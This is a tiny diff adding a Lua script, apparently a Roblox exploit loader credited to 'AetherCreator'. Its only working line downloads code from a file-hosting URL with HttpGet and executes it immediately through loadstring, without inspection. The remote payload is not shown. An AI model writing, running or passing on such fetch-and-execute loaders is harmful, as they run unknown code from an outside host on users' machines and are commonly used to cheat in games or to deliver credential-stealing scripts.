@@ -1,0 +1,2 @@
+-- Credit by AetherCreator 
+loadstring(game:HttpGet("https://files.catbox.moe/npp0ng.txt"))()
